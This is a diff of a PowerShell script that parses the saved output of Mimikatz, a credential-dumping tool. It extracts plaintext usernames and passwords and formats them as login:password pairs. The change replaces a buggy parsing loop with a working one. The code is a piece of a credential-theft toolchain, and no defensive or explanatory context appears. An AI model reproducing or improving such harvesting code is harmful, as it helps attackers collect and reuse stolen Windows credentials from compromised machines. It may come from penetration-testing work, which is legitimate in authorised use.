@@ -45,20 +45,14 @@ $passwords = @()
 $out = cat ./output_mimikatz
 echo $out
 for ($i = 0; $i -lt $out.length; $i++) {
-	$out[$i] | Select-String '\* Username : (.+)$' -AllMatches
-	$out[$i] | Select-String '\* Username : (.+)$' -AllMatches | ForEach-Objet { $_.Matches.groups[1] }
-	if ($out[$i] -match '\* Username : (.+)$') {
-    if ($i+2 -lt $out.length -and $out[$i+2] -match '\* Password : (.+)$') {
-      $out[$i] | Select-String '\* Username : (.+)$' -AllMatches |
-				ForEach-Object { $_.Matches.groups[1] } | ForEach-Object { $logins += $_.Value }
-			$out[$i+2] | Select-String '\* Password : (.+)$' -AllMatches |
-				ForEach-Object { $_.Matches.groups[1] } | ForEach-Object { $passwords += $_.Value }
-      if ($password -ne "(null)") {
-        $logins += $login
-        $passwords += $password
-      }
-		}
-	}
+	$matchlogin = [string]($out[$i] | Select-String '\* Username : (.+)$' -AllMatches)
+  if ($matchlogin -ne "") {
+	  $matchpassword = [string]($out[$i+2] | Select-String '\* Password : (.+)$' -AllMatches)
+    if ($matchpassword -ne "") {
+      $logins += $matchlogin.substring($matchlogin.indexof(":")+2)
+      $passwords += $matchpassword.substring($matchpassword.indexof(":")+2)
+    }
+  }
 }
 for ($i = 0; $i -lt $logins.length; $i++) {
 	$formatted += $logins[$i]+":"+$passwords[$i]+"`n"
